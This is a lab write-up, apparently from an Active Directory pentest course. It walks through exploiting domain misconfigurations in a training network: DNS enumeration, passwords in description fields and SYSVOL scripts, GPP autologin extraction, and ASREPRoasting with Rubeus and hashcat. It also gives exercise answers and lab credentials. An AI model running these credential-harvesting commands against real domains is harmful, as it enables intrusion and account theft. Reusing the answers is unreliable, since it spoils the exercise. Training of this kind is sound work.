<div align='center'>

# **Lab 20: Miscellaneous Misconfigurations** 

</div>

## **Enumerating DNS Records**

**Using adidnsdump**

```zsh
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```

Enter the password for the user when prompted: `Klmcargo2`

We get 20 records

![](../imgs/Lab/Lab20/1.png)

**Viewing the Contents of the records.csv File**

![](../imgs/Lab/Lab20/2.png)

**Using the -r Option to Resolve Unknown Records**

```zsh
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r 
```

![](../imgs/Lab/Lab20/3.png)

**Finding Hidden Records in the records.csv File**

![](../imgs/Lab/Lab20/4.png)

## **Password in Description Field**

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

![](../imgs/Lab/Lab20/5.png)

We can see the user `ldap.agent` with password `Sunsh1ne4All!`

## **PASSWD_NOTREQD Field**

If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

![](../imgs/Lab/Lab20/6.png)

**Question:** Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".

- **Answer:** ygroce

![](../imgs/Lab/Lab20/7.png)

## **Credentials in SMB Shares and SYSVOL Scripts**

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

We see an interesting script `reset_local_admin_pass.vbs`

![](../imgs/Lab/Lab20/8.png)

**Discovering the Password in the Script**

![](../imgs/Lab/Lab20/9.png)

We can see the password `!ILFREIGHT_L0cALADmin!` may be the password for user `Administrator`

## **Group Policy Preferences (GPP) Passwords**

**Using CrackMapExec's gpp_autologin Module**

```zsh
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

![](../imgs/Lab/Lab20/10.png)

We can see user `guarddesk` with password `ILFreightguardadmin!`

## **ASREPRoasting**

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

**Viewing an Account with the Do not Require Kerberos Preauthentication Option**

![](../imgs/Lab/Lab20/11.png)

**Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser**

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

![](../imgs/Lab/Lab20/12.png)

We see two users: `ygroce` and `mmorgan`

**Retrieving AS-REP in Proper Format using Rubeus**

```powershell
Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```

![](../imgs/Lab/Lab20/13.png)

We get the [AS-REP hash](../docs/ygroce_AS-REP.txt) for user `ygroce`

**Cracking the Hash Offline with Hashcat**

```zsh
hashcat -m 18200 ygroce_AS-REP.txt /usr/share/wordlists/rockyou.txt
```

![](../imgs/Lab/Lab20/14.png)

We get the password `Pass@word`

**Questions**: Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.

- **Answer:** Pass@word

![](../imgs/Lab/Lab20/15.png)

**Other ways to perform ASREPRoasting**

Retrieving the AS-REP Using Kerbrute

```zsh
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

![](../imgs/Lab/Lab20/16.png)

Using GetNPUsers.py

```zsh
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

![](../imgs/Lab/Lab20/17.png)